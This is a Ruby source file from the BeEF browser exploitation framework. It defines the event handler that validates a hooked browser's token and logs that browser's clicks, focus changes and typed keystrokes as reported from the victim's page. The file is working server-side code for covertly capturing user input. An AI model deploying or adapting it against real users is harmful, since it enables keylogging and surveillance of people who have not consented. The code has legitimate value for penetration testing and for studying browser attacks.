module BeEF
module Extension
module Events
    
  #
  # The http handler that manages the Events.
  #
  class Handler < WEBrick::HTTPServlet::AbstractServlet
    
    attr_reader :guard
    
    Z = BeEF::Core::Models::HookedBrowser
    
    #
    # Class constructor
    #
    def initialize(data)
      # we set up a mutex
      @guard = Mutex.new
      @data = data
      setup()
    end

    #
    # Sets up event logging
    #
    def setup()
      
      # validates the hook token
      beef_hook = @data['beefhook'] || nil 
      raise WEBrick::HTTPStatus::BadRequest, "beef_hook is null" if beef_hook.nil?

      # validates that a hooked browser with the beef_hook token exists in the db
      zombie = Z.first(:session => beef_hook) || nil
      raise WEBrick::HTTPStatus::BadRequest, "Invalid beef hook id: the hooked browser cannot be found in the database" if zombie.nil?
     
      events = @data['results']

      # push events to logger
      if (events.kind_of?(Array))
        logger = BeEF::Core::Logger.instance
        events.each{|e|
            logger.register('Event', parse(e), zombie.id)
        }
      end

    end

    def parse(event)
        case event['type']
            when 'click'
                return event['time'].to_s+'s - [Mouse Click] x: '+event['x'].to_s+' y:'+event['y'].to_s+' > '+event['target'].to_s
            when 'focus'
                return event['time'].to_s+'s - [Focus] Browser has regained focus.'
            when 'blur'
                return event['time'].to_s+'s - [Blur] Browser has lost focus.'
            when 'keys'
                return event['time'].to_s+'s - [User Typed] "'+event['data'].to_s+'" > '+event['target'].to_s
        end
        print_debug 'Event handler has recieved an unknown event'
        return 'Unknown event'
    end
    
  end
  
end
end
end
